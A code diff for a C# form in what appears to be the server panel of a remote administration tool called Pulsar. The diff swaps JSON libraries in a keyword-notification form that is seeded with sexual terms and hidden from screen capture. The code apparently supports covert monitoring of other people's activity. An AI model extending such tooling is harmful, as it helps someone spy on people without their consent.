@@ -1,14 +1,10 @@
-﻿using Pulsar.Server.Forms.DarkMode;
+﻿using Newtonsoft.Json;
+using Pulsar.Server.Forms.DarkMode;
 using System;
 using System.Collections.Generic;
-using System.ComponentModel;
-using System.Data;
-using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
-using System.Text.Json;
-using System.Threading.Tasks;
 using System.Windows.Forms;
 
 namespace Pulsar.Server.Forms
@@ -19,7 +15,7 @@ namespace Pulsar.Server.Forms
         {
             InitializeComponent();
             DarkModeManager.ApplyDarkMode(this);
-			ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
+            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);
         }
 
         private void SaveNoti_Click(object sender, EventArgs e)
@@ -29,7 +25,7 @@ namespace Pulsar.Server.Forms
                                .Select(word => word.Trim())
                                .Where(word => !string.IsNullOrWhiteSpace(word))
                                .ToList();
-            string json = JsonSerializer.Serialize(keywords, new JsonSerializerOptions { WriteIndented = true });
+            string json = JsonConvert.SerializeObject(keywords, Formatting.Indented);
             string exeDir = AppDomain.CurrentDomain.BaseDirectory;
             string filePath = Path.Combine(exeDir, "keywords.json");
             File.WriteAllText(filePath, json, Encoding.UTF8);
@@ -48,14 +44,14 @@ namespace Pulsar.Server.Forms
                 #region BANNED WORDS
                 var exampleKeywords = new List<string> { "porn", "sex", "xxx", "hentai", "boobs", "tits", "cock", "dick", "pussy" };
                 #endregion
-                string exampleJson = JsonSerializer.Serialize(exampleKeywords, new JsonSerializerOptions { WriteIndented = true });
+                string exampleJson = JsonConvert.SerializeObject(exampleKeywords, Formatting.Indented);
                 File.WriteAllText(filePath, exampleJson, Encoding.UTF8);
             }
 
             if (File.Exists(filePath))
             {
                 string json = File.ReadAllText(filePath, Encoding.UTF8);
-                var keywords = JsonSerializer.Deserialize<List<string>>(json);
+                var keywords = JsonConvert.DeserializeObject<List<string>>(json);
 
                 if (keywords != null && keywords.Any())
                 {
